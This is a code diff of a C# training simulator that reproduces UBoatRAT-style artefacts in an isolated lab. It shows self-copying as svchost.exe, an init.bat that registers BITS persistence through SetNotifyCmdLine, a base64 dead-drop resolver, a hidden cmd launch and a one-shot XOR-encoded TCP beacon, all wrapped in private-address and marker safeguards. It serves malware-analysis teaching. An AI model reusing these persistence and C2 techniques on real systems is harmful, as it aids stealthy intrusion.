@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
+using System.Security.Principal;
 using System.Text;
 using System.Text.RegularExpressions;
 
@@ -13,59 +14,25 @@ namespace UBoatRATLab
         /*
          * BENIGN EDUCATIONAL SIMULATOR
          *
-         * This program does not implement a RAT, command execution,
-         * file exfiltration, remote administration, credential access,
-         * reconnaissance, or a remotely controlled command channel.
+         * This program does not implement a RAT, remote command execution,
+         * credential access, file exfiltration, interactive control, or a
+         * persistent command channel.
          *
          * It reproduces a restricted set of observable UBoatRAT-style
-         * artefacts for an isolated cybersecurity training lab:
+         * artefacts inside the laboratory directory only:
          *
-         *   1. A suspiciously named executable outside System32.
-         *   2. An init.bat file that registers a BITS job.
-         *   3. A BITS SetNotifyCmdLine callback.
-         *   4. Retrieval of a controlled dead-drop resolver.
-         *   5. A one-shot, fixed, non-interactive TCP beacon.
-         *
-         * Multiple safety controls prevent the simulator from being used
-         * outside the prepared lab environment.
+         *   1. Creates a runtime\svchost.exe copy.
+         *   2. Creates runtime\init.bat.
+         *   3. Registers a BITS download job with SetNotifyCmdLine.
+         *   4. Retrieves a controlled dead-drop resolver.
+         *   5. Sends one fixed, one-shot, XOR-encoded benign beacon.
          */
 
-        private const string LabRoot =
-            @"C:\ProgramData\UBoatRAT_Lab";
+        private const string RuntimeDirectoryName = "runtime";
+        private const string LabMarkerName = "UBoatRAT_LAB.marker";
+        private const string JobName = "UBoatLab_Persistence";
 
-        private const string InstalledCopy =
-            @"C:\ProgramData\UBoatRAT_Lab\svchost.exe";
-
-        private const string InitBatch =
-            @"C:\ProgramData\UBoatRAT_Lab\init.bat";
-
-        private const string LabMarkerName =
-            "UBoatRAT_LAB.marker";
-
-        private const string InstalledMarker =
-            @"C:\ProgramData\UBoatRAT_Lab\UBoatRAT_LAB.marker";
-
-        private const string CallbackLog =
-            @"C:\ProgramData\UBoatRAT_Lab\callback.log";
-
-        private const string ExecutionLog =
-            @"C:\ProgramData\UBoatRAT_Lab\execution.log";
-
-        private const string ResolverEvidence =
-            @"C:\ProgramData\UBoatRAT_Lab\resolver_response.txt";
-
-        private const string BeaconMarker =
-            @"C:\ProgramData\UBoatRAT_Lab\beacon.sent";
-
-        private const string JobName =
-            "UBoatLab_Persistence";
-
-        /*
-         * The resolver hostname is fixed.
-         * lab_start.ps1 maps it to the private Ubuntu VM IP.
-         */
-        private const string ResolverHost =
-            "uboat-c2.test";
+        private const string ResolverHost = "uboat-c2.test";
 
         private const string TriggerUrl =
             "http://uboat-c2.test:8080/c2/trigger.dat";
@@ -73,19 +40,65 @@ namespace UBoatRATLab
         private const string ResolverUrl =
             "http://uboat-c2.test:8080/resolver/README.md";
 
-        /*
-         * The TCP destination port cannot be changed by the resolver.
-         */
         private const int BeaconPort = 9001;
+        private const byte XorKey = 0x88;
 
-        /*
-         * Static beacon only. No hostname, username, files, credentials,
-         * commands, environment data, or user information are collected.
-         */
         private const string BeaconText =
             "488|UBOATRAT_LAB|BENIGN_BEACON|NO_COMMAND_CHANNEL";
 
-        private const byte XorKey = 0x88;
+        /*
+         * When the original executable runs, ExecutableDirectory is:
+         *
+         * C:\Users\Administrator\Desktop\Labs\UBoatRAT
+         *
+         * When BITS launches the copied executable, ExecutableDirectory is:
+         *
+         * C:\Users\Administrator\Desktop\Labs\UBoatRAT\runtime
+         *
+         * DetermineLabDirectory handles both situations.
+         */
+
+        private static readonly string ExecutableDirectory =
+            GetExecutableDirectory();
+
+        private static readonly string LabDirectory =
+            DetermineLabDirectory(ExecutableDirectory);
+
+        private static readonly string RuntimeDirectory =
+            Path.Combine(LabDirectory, RuntimeDirectoryName);
+
+        private static readonly string SourceMarker =
+            Path.Combine(LabDirectory, LabMarkerName);
+
+        private static readonly string InstalledCopy =
+            Path.Combine(RuntimeDirectory, "svchost.exe");
+
+        private static readonly string InstalledMarker =
+            Path.Combine(RuntimeDirectory, LabMarkerName);
+
+        private static readonly string InitBatch =
+            Path.Combine(RuntimeDirectory, "init.bat");
+
+        private static readonly string BitsAdminLog =
+            Path.Combine(RuntimeDirectory, "bitsadmin.log");
+
+        private static readonly string CallbackLog =
+            Path.Combine(RuntimeDirectory, "callback.log");
+
+        private static readonly string ExecutionLog =
+            Path.Combine(RuntimeDirectory, "execution.log");
+
+        private static readonly string ResolverEvidence =
+            Path.Combine(RuntimeDirectory, "resolver_response.txt");
+
+        private static readonly string BeaconMarker =
+            Path.Combine(RuntimeDirectory, "beacon.sent");
+
+        private static readonly string TriggerDestination =
+            Path.Combine(RuntimeDirectory, "uboat_lab_trigger.dat");
+
+        private static readonly string BlockedLog =
+            Path.Combine(LabDirectory, "UBoatRAT_Lab_Blocked.log");
 
         [STAThread]
         private static void Main(string[] args)
@@ -105,44 +118,51 @@ namespace UBoatRATLab
 
                 RunInitialStage();
             }
-            catch (Exception ex)
+            catch (Exception exception)
             {
-                WriteEmergencyLog(ex);
+                WriteEmergencyLog(exception);
             }
         }
 
         private static void RunInitialStage()
         {
             /*
-             * Safety control 1:
-             * Refuse to run unless the setup script placed a lab marker
-             * next to the original executable.
+             * The initial stage is expected to be launched from the
+             * Administrator PowerShell prepared by lab_start.ps1.
              */
-            string sourceDirectory =
-                AppDomain.CurrentDomain.BaseDirectory;
 
-            string sourceMarker =
-                Path.Combine(sourceDirectory, LabMarkerName);
-
-            if (!File.Exists(sourceMarker))
+            if (!IsAdministrator())
             {
                 WriteBlockedLog(
-                    "Execution blocked: UBoatRAT_LAB.marker was not found " +
-                    "next to the executable.");
+                    "Execution blocked: run WinSvcHelper.exe from an " +
+                    "Administrator PowerShell inside the lab directory.");
 
                 return;
             }
 
             /*
-             * Safety control 2:
-             * The fixed lab hostname must resolve to an RFC1918 private
-             * IPv4 address before any BITS job or network activity occurs.
+             * Refuse execution unless the explicit benign-lab marker exists
+             * next to the original executable.
              */
-            IPAddress resolverAddress;
 
-            if (!TryResolvePrivateAddress(
-                    ResolverHost,
-                    out resolverAddress))
+            if (!File.Exists(SourceMarker))
+            {
+                WriteBlockedLog(
+                    "Execution blocked: " + LabMarkerName +
+                    " was not found next to WinSvcHelper.exe.");
+
+                return;
+            }
+
+            /*
+             * No activity starts unless the fixed lab hostname resolves to
+             * an RFC1918 private IPv4 address.
+             */
+
+            IPAddress[] resolverAddresses =
+                ResolvePrivateIpv4Addresses(ResolverHost);
+
+            if (resolverAddresses.Length == 0)
             {
                 WriteBlockedLog(
                     "Execution blocked: " + ResolverHost +
@@ -151,7 +171,7 @@ namespace UBoatRATLab
                 return;
             }
 
-            Directory.CreateDirectory(LabRoot);
+            Directory.CreateDirectory(RuntimeDirectory);
 
             WriteLog(
                 ExecutionLog,
@@ -159,37 +179,47 @@ namespace UBoatRATLab
 
             WriteLog(
                 ExecutionLog,
+                "Laboratory directory: " + LabDirectory);
+
+            WriteLog(
+                ExecutionLog,
+                "Runtime directory: " + RuntimeDirectory);
+
+            WriteLog(
+                ExecutionLog,
                 "Resolver validated as private address: " +
-                resolverAddress);
+                resolverAddresses[0]);
 
             string currentExecutable =
                 Process.GetCurrentProcess().MainModule.FileName;
 
             /*
-             * Prevent accidental recursive installation when someone
-             * launches the copied file manually without --bits-callback.
+             * If someone manually launches runtime\svchost.exe without the
+             * callback argument, do nothing. This prevents recursive setup.
              */
-            if (PathsEqual(currentExecutable, InstalledCopy))
+
+            if (PathsEqual(currentExecutable, InstalledCopy) ||
+                IsRunningFromRuntimeDirectory())
             {
                 WriteLog(
                     ExecutionLog,
-                    "Installed copy was launched without --bits-callback. " +
-                    "No action was performed.");
+                    "The runtime copy was launched without " +
+                    "--bits-callback. No action was performed.");
 
                 return;
             }
 
             /*
-             * Reproduce the suspicious naming artefact while keeping every
-             * file inside the clearly labelled laboratory directory.
+             * Copy only into the runtime subdirectory of the lab.
              */
+
             File.Copy(
                 currentExecutable,
                 InstalledCopy,
                 true);
 
             File.Copy(
-                sourceMarker,
+                SourceMarker,
                 InstalledMarker,
                 true);
 
@@ -202,7 +232,7 @@ namespace UBoatRATLab
 
             WriteLog(
                 ExecutionLog,
-                "BITS bootstrap was launched through init.bat.");
+                "BITS bootstrap completed through init.bat.");
 
             WriteLog(
                 ExecutionLog,
@@ -211,28 +241,19 @@ namespace UBoatRATLab
 
         private static void CreateInitBatch()
         {
-            string tempDirectory =
-                Path.GetTempPath().TrimEnd(
-                    Path.DirectorySeparatorChar,
-                    Path.AltDirectorySeparatorChar);
-
-            string triggerDestination =
-                Path.Combine(
-                    tempDirectory,
-                    "uboat_lab_trigger.dat");
-
             /*
-             * The original malware deleted init.bat after running it.
-             * This benign version deliberately preserves it so the student
-             * can inspect the artefact during the investigation.
+             * The batch file is intentionally preserved so students can
+             * inspect it during the behavioral-analysis portion.
              *
-             * The BITS job downloads only a harmless trigger file.
-             * Its notification command starts this simulator in the fixed
-             * --bits-callback mode.
+             * The BITS job downloads only an inert trigger file.
+             * SetNotifyCmdLine launches the fixed copied simulator with the
+             * fixed --bits-callback argument.
              */
+
             string[] batchLines =
             {
                 "@echo off",
+                "setlocal",
                 "rem ======================================================",
                 "rem BENIGN UBoatRAT laboratory simulation",
                 "rem No malware or remote command channel is implemented.",
@@ -242,22 +263,39 @@ namespace UBoatRATLab
                 "bitsadmin /cancel \"" + JobName +
                     "\" >nul 2>&1",
                 "",
+                "del /f /q \"" + TriggerDestination +
+                    "\" >nul 2>&1",
+                "",
+                "del /f /q \"" + BitsAdminLog +
+                    "\" >nul 2>&1",
+                "",
                 "bitsadmin /create /download \"" +
-                    JobName + "\"",
+                    JobName + "\" > \"" +
+                    BitsAdminLog + "\" 2>&1",
+                "",
+                "if errorlevel 1 exit /b 10",
                 "",
                 "bitsadmin /addfile \"" +
                     JobName + "\" \"" +
                     TriggerUrl + "\" \"" +
-                    triggerDestination + "\"",
+                    TriggerDestination + "\" >> \"" +
+                    BitsAdminLog + "\" 2>&1",
+                "",
+                "if errorlevel 1 exit /b 11",
                 "",
                 "bitsadmin /setnotifycmdline \"" +
                     JobName + "\" \"" +
-                    InstalledCopy + "\" \"" +
-                    InstalledCopy +
-                    " --bits-callback\"",
+                    InstalledCopy + "\" " +
+                    "\"--bits-callback\" >> \"" +
+                    BitsAdminLog + "\" 2>&1",
+                "",
+                "if errorlevel 1 exit /b 12",
                 "",
                 "bitsadmin /resume \"" +
-                    JobName + "\"",
+                    JobName + "\" >> \"" +
+                    BitsAdminLog + "\" 2>&1",
+                "",
+                "if errorlevel 1 exit /b 13",
                 "",
                 "exit /b 0"
             };
@@ -279,37 +317,86 @@ namespace UBoatRATLab
                 new ProcessStartInfo();
 
             startInfo.FileName = "cmd.exe";
+
+            /*
+             * The double quotes around the batch path are required because
+             * the laboratory directory may contain spaces.
+             */
+
             startInfo.Arguments =
-                "/d /c \"" + InitBatch + "\"";
+                "/d /c \"\"" +
+                InitBatch +
+                "\"\"";
+
+            startInfo.WorkingDirectory =
+                RuntimeDirectory;
 
             startInfo.UseShellExecute = false;
             startInfo.CreateNoWindow = true;
+
             startInfo.WindowStyle =
                 ProcessWindowStyle.Hidden;
 
-            Process process =
-                Process.Start(startInfo);
-
-            if (process == null)
+            using (Process process =
+                Process.Start(startInfo))
             {
-                throw new InvalidOperationException(
-                    "cmd.exe could not be started.");
+                if (process == null)
+                {
+                    throw new InvalidOperationException(
+                        "cmd.exe could not be started.");
+                }
+
+                if (!process.WaitForExit(20000))
+                {
+                    try
+                    {
+                        process.Kill();
+                    }
+                    catch
+                    {
+                        // Best-effort termination only.
+                    }
+
+                    throw new TimeoutException(
+                        "init.bat did not finish within 20 seconds.");
+                }
+
+                if (process.ExitCode != 0)
+                {
+                    throw new InvalidOperationException(
+                        "init.bat failed with exit code " +
+                        process.ExitCode +
+                        ". Check runtime\\bitsadmin.log.");
+                }
             }
         }
 
         private static void RunBitsCallback()
         {
-            Directory.CreateDirectory(LabRoot);
+            Directory.CreateDirectory(RuntimeDirectory);
 
             WriteLog(
                 CallbackLog,
                 "BITS callback process started.");
 
             /*
-             * Safety control 3:
-             * Only a copy installed by the prepared lab may execute the
-             * callback stage.
+             * The callback is accepted only when it is the installed
+             * runtime copy launched from the expected path.
              */
+
+            if (!IsRunningFromRuntimeDirectory() ||
+                !PathsEqual(
+                    Process.GetCurrentProcess().MainModule.FileName,
+                    InstalledCopy))
+            {
+                WriteLog(
+                    CallbackLog,
+                    "Callback blocked: process is not the installed " +
+                    "runtime copy.");
+
+                return;
+            }
+
             if (!File.Exists(InstalledMarker))
             {
                 WriteLog(
@@ -320,102 +407,129 @@ namespace UBoatRATLab
             }
 
             /*
-             * Safety control 4:
-             * Permit only one successful beacon per snapshot/session.
+             * CreateNew acts as a one-shot lock. Concurrent callbacks cannot
+             * send multiple beacons.
              */
-            if (File.Exists(BeaconMarker))
+
+            if (!TryAcquireBeaconGuard())
             {
                 WriteLog(
                     CallbackLog,
-                    "One-shot beacon already sent. No network activity " +
-                    "was performed.");
+                    "One-shot beacon already sent or currently in " +
+                    "progress. No network activity was performed.");
 
                 return;
             }
 
-            IPAddress resolverAddress;
+            bool beaconSent = false;
 
-            if (!TryResolvePrivateAddress(
-                    ResolverHost,
-                    out resolverAddress))
+            try
             {
-                WriteLog(
-                    CallbackLog,
-                    "Callback blocked: resolver does not point to a " +
-                    "private IPv4 address.");
+                IPAddress[] resolverAddresses =
+                    ResolvePrivateIpv4Addresses(ResolverHost);
 
-                return;
-            }
+                if (resolverAddresses.Length == 0)
+                {
+                    WriteLog(
+                        CallbackLog,
+                        "Callback blocked: resolver does not point to a " +
+                        "private IPv4 address.");
 
-            string resolverContent =
-                DownloadResolver();
+                    return;
+                }
 
-            File.WriteAllText(
-                ResolverEvidence,
-                resolverContent,
-                Encoding.UTF8);
+                string resolverContent =
+                    DownloadResolver();
 
-            IPAddress targetAddress;
-            int targetPort;
-
-            if (!TryParseResolver(
+                File.WriteAllText(
+                    ResolverEvidence,
                     resolverContent,
-                    out targetAddress,
-                    out targetPort))
-            {
+                    Encoding.UTF8);
+
+                IPAddress targetAddress;
+                int targetPort;
+
+                if (!TryParseResolver(
+                        resolverContent,
+                        out targetAddress,
+                        out targetPort))
+                {
+                    WriteLog(
+                        CallbackLog,
+                        "Resolver parsing failed. No beacon was sent.");
+
+                    return;
+                }
+
+                /*
+                 * The resolver cannot redirect the simulator elsewhere.
+                 * The decoded IP must equal one of the private addresses
+                 * resolved for uboat-c2.test.
+                 */
+
+                if (!ContainsAddress(
+                        resolverAddresses,
+                        targetAddress))
+                {
+                    WriteLog(
+                        CallbackLog,
+                        "Callback blocked: decoded target does not " +
+                        "match the resolver host.");
+
+                    return;
+                }
+
+                if (targetPort != BeaconPort)
+                {
+                    WriteLog(
+                        CallbackLog,
+                        "Callback blocked: decoded port is not the " +
+                        "fixed laboratory port 9001.");
+
+                    return;
+                }
+
+                SendOneShotBeacon(
+                    targetAddress,
+                    targetPort);
+
+                beaconSent = true;
+
+                File.WriteAllText(
+                    BeaconMarker,
+                    "A single benign beacon was sent at " +
+                    DateTime.UtcNow.ToString("O") +
+                    Environment.NewLine,
+                    Encoding.ASCII);
+
                 WriteLog(
                     CallbackLog,
-                    "Resolver parsing failed. No beacon was sent.");
+                    "One-shot benign beacon sent successfully.");
 
-                return;
-            }
-
-            /*
-             * Safety control 5:
-             * The decoded target must be the exact same private host as the
-             * HTTP resolver, and the destination port is fixed to 9001.
-             *
-             * The resolver therefore cannot redirect the simulator toward
-             * another machine.
-             */
-            if (!targetAddress.Equals(resolverAddress))
-            {
                 WriteLog(
                     CallbackLog,
-                    "Callback blocked: decoded target does not match " +
-                    "the resolver host.");
-
-                return;
+                    "No response was read and no command channel " +
+                    "was opened.");
             }
-
-            if (targetPort != BeaconPort)
+            finally
             {
-                WriteLog(
-                    CallbackLog,
-                    "Callback blocked: decoded port is not the fixed " +
-                    "laboratory port 9001.");
+                /*
+                 * If the network operation failed, remove the pending
+                 * marker so a later controlled test can retry.
+                 */
 
-                return;
+                if (!beaconSent)
+                {
+                    try
+                    {
+                        File.Delete(BeaconMarker);
+                    }
+                    catch
+                    {
+                        // Best-effort cleanup only.
+                    }
+                }
             }
-
-            SendOneShotBeacon(
-                targetAddress,
-                targetPort);
-
-            File.WriteAllText(
-                BeaconMarker,
-                "A single benign beacon was sent at " +
-                DateTime.UtcNow.ToString("O") +
-                Environment.NewLine,
-                Encoding.ASCII);
-
-            WriteLog(
-                CallbackLog,
-                "One-shot benign beacon sent successfully.");
-
-            WriteLog(
-                CallbackLog,
-                "No response was read and no command channel was opened.");
         }
 
         private static string DownloadResolver()
@@ -428,6 +542,11 @@ namespace UBoatRATLab
             using (TimeoutWebClient client =
                 new TimeoutWebClient(5000))
             {
+                /*
+                 * The private lab route is accessed directly instead of
+                 * being sent through a workstation or corporate proxy.
+                 */
+
                 client.Proxy = null;
 
                 client.Headers[
@@ -454,14 +573,15 @@ namespace UBoatRATLab
             }
 
             /*
-             * Expected format:
+             * Expected resolver format:
              *
-             * [Rudeltaktik]<BASE64_ENCODED_PRIVATE_IP_AND_PORT>!
+             * [Rudeltaktik]<BASE64_PRIVATE_IP_AND_PORT>!
              *
-             * Decoded example:
+             * Example decoded value:
              *
              * 10.10.20.15:9001
              */
+
             Match match = Regex.Match(
                 resolverContent,
                 @"\[Rudeltaktik\](?<value>[A-Za-z0-9+/=]+)!",
@@ -472,16 +592,13 @@ namespace UBoatRATLab
                 return false;
             }
 
-            string encodedValue =
-                match.Groups["value"].Value;
-
             string decodedValue;
 
             try
             {
                 byte[] decodedBytes =
                     Convert.FromBase64String(
-                        encodedValue);
+                        match.Groups["value"].Value);
 
                 decodedValue =
                     Encoding.ASCII.GetString(
@@ -528,12 +645,8 @@ namespace UBoatRATLab
                 return false;
             }
 
-            if (!IsPrivateIpv4(parsedAddress))
-            {
-                return false;
-            }
-
-            if (parsedPort != BeaconPort)
+            if (!IsPrivateIpv4(parsedAddress) ||
+                parsedPort != BeaconPort)
             {
                 return false;
             }
@@ -554,6 +667,12 @@ namespace UBoatRATLab
             IPAddress address,
             int port)
         {
+            /*
+             * The payload is fixed at compile time.
+             * It contains no hostname, username, files, environment data,
+             * credentials, or collected information.
+             */
+
             byte[] plaintext =
                 Encoding.ASCII.GetBytes(
                     BeaconText);
@@ -566,7 +685,10 @@ namespace UBoatRATLab
                  index++)
             {
                 encoded[index] =
-                    (byte)(plaintext[index] ^ XorKey);
+                    (byte)(
+                        plaintext[index] ^
+                        XorKey
+                    );
             }
 
             using (TcpClient client =
@@ -592,7 +714,8 @@ namespace UBoatRATLab
                         "The TCP laboratory listener did not respond.");
                 }
 
-                client.EndConnect(connectResult);
+                client.EndConnect(
+                    connectResult);
 
                 client.SendTimeout = 5000;
                 client.ReceiveTimeout = 5000;
@@ -616,33 +739,103 @@ namespace UBoatRATLab
 
             WriteLog(
                 CallbackLog,
-                "Sent " + encoded.Length +
+                "Sent " +
+                encoded.Length +
                 " XOR-encoded bytes to the fixed lab listener.");
         }
 
-        private static bool TryResolvePrivateAddress(
-            string hostname,
-            out IPAddress privateAddress)
+        private static bool TryAcquireBeaconGuard()
         {
-            privateAddress = null;
+            try
+            {
+                using (FileStream stream =
+                    new FileStream(
+                        BeaconMarker,
+                        FileMode.CreateNew,
+                        FileAccess.Write,
+                        FileShare.None))
+                {
+                    byte[] content =
+                        Encoding.ASCII.GetBytes(
+                            "Beacon pending at " +
+                            DateTime.UtcNow.ToString("O") +
+                            Environment.NewLine);
 
+                    stream.Write(
+                        content,
+                        0,
+                        content.Length);
+
+                    stream.Flush();
+                }
+
+                return true;
+            }
+            catch (IOException)
+            {
+                return false;
+            }
+        }
+
+        private static IPAddress[] ResolvePrivateIpv4Addresses(
+            string hostname)
+        {
             try
             {
                 IPAddress[] addresses =
-                    Dns.GetHostAddresses(hostname);
+                    Dns.GetHostAddresses(
+                        hostname);
 
-                foreach (IPAddress address in addresses)
+                IPAddress[] privateAddresses =
+                    new IPAddress[
+                        addresses.Length
+                    ];
+
+                int count = 0;
+
+                for (int index = 0;
+                     index < addresses.Length;
+                     index++)
                 {
-                    if (IsPrivateIpv4(address))
+                    if (IsPrivateIpv4(
+                            addresses[index]))
                     {
-                        privateAddress = address;
-                        return true;
+                        privateAddresses[count] =
+                            addresses[index];
+
+                        count++;
                     }
                 }
+
+                IPAddress[] result =
+                    new IPAddress[count];
+
+                Array.Copy(
+                    privateAddresses,
+                    result,
+                    count);
+
+                return result;
             }
             catch
             {
-                return false;
+                return new IPAddress[0];
+            }
+        }
+
+        private static bool ContainsAddress(
+            IPAddress[] addresses,
+            IPAddress target)
+        {
+            for (int index = 0;
+                 index < addresses.Length;
+                 index++)
+            {
+                if (addresses[index].Equals(
+                        target))
+                {
+                    return true;
+                }
             }
 
             return false;
@@ -662,12 +855,13 @@ namespace UBoatRATLab
                 address.GetAddressBytes();
 
             /*
-             * RFC1918 ranges only:
+             * RFC1918 ranges:
              *
              * 10.0.0.0/8
              * 172.16.0.0/12
              * 192.168.0.0/16
              */
+
             if (bytes[0] == 10)
             {
                 return true;
@@ -689,21 +883,81 @@ namespace UBoatRATLab
             return false;
         }
 
+        private static bool IsAdministrator()
+        {
+            WindowsIdentity identity =
+                WindowsIdentity.GetCurrent();
+
+            WindowsPrincipal principal =
+                new WindowsPrincipal(
+                    identity);
+
+            return principal.IsInRole(
+                WindowsBuiltInRole.Administrator);
+        }
+
+        private static string GetExecutableDirectory()
+        {
+            return AppDomain
+                .CurrentDomain
+                .BaseDirectory
+                .TrimEnd(
+                    Path.DirectorySeparatorChar,
+                    Path.AltDirectorySeparatorChar);
+        }
+
+        private static string DetermineLabDirectory(
+            string executableDirectory)
+        {
+            string directoryName =
+                Path.GetFileName(
+                    executableDirectory);
+
+            if (string.Equals(
+                    directoryName,
+                    RuntimeDirectoryName,
+                    StringComparison.OrdinalIgnoreCase))
+            {
+                DirectoryInfo parent =
+                    Directory.GetParent(
+                        executableDirectory);
+
+                if (parent == null)
+                {
+                    throw new InvalidOperationException(
+                        "Could not determine the laboratory directory.");
+                }
+
+                return parent.FullName;
+            }
+
+            return executableDirectory;
+        }
+
+        private static bool IsRunningFromRuntimeDirectory()
+        {
+            return PathsEqual(
+                ExecutableDirectory,
+                RuntimeDirectory);
+        }
+
         private static bool PathsEqual(
             string firstPath,
             string secondPath)
         {
             string normalizedFirst =
-                Path.GetFullPath(firstPath)
-                    .TrimEnd(
-                        Path.DirectorySeparatorChar,
-                        Path.AltDirectorySeparatorChar);
+                Path.GetFullPath(
+                    firstPath)
+                .TrimEnd(
+                    Path.DirectorySeparatorChar,
+                    Path.AltDirectorySeparatorChar);
 
             string normalizedSecond =
-                Path.GetFullPath(secondPath)
-                    .TrimEnd(
-                        Path.DirectorySeparatorChar,
-                        Path.AltDirectorySeparatorChar);
+                Path.GetFullPath(
+                    secondPath)
+                .TrimEnd(
+                    Path.DirectorySeparatorChar,
+                    Path.AltDirectorySeparatorChar);
 
             return string.Equals(
                 normalizedFirst,
@@ -717,8 +971,16 @@ namespace UBoatRATLab
         {
             try
             {
-                Directory.CreateDirectory(
-                    Path.GetDirectoryName(logPath));
+                string directory =
+                    Path.GetDirectoryName(
+                        logPath);
+
+                if (!string.IsNullOrEmpty(
+                        directory))
+                {
+                    Directory.CreateDirectory(
+                        directory);
+                }
 
                 string line =
                     "[" +
@@ -743,26 +1005,9 @@ namespace UBoatRATLab
         private static void WriteBlockedLog(
             string message)
         {
-            try
-            {
-                string blockedLog =
-                    Path.Combine(
-                        Path.GetTempPath(),
-                        "UBoatRAT_Lab_Blocked.log");
-
-                File.AppendAllText(
-                    blockedLog,
-                    "[" +
-                    DateTime.UtcNow.ToString("O") +
-                    "] " +
-                    message +
-                    Environment.NewLine,
-                    Encoding.UTF8);
-            }
-            catch
-            {
-                // Fail closed and silently.
-            }
+            WriteLog(
+                BlockedLog,
+                message);
         }
 
         private static void WriteEmergencyLog(
@@ -771,17 +1016,19 @@ namespace UBoatRATLab
             try
             {
                 Directory.CreateDirectory(
-                    LabRoot);
+                    RuntimeDirectory);
 
                 WriteLog(
                     Path.Combine(
-                        LabRoot,
+                        RuntimeDirectory,
                         "error.log"),
                     exception.ToString());
             }
             catch
             {
-                // Fail closed and silently.
+                /*
+                 * Fail closed and silently.
+                 */
             }
         }
 
@@ -801,7 +1048,8 @@ namespace UBoatRATLab
                 Uri address)
             {
                 WebRequest request =
-                    base.GetWebRequest(address);
+                    base.GetWebRequest(
+                        address);
 
                 if (request != null)
                 {
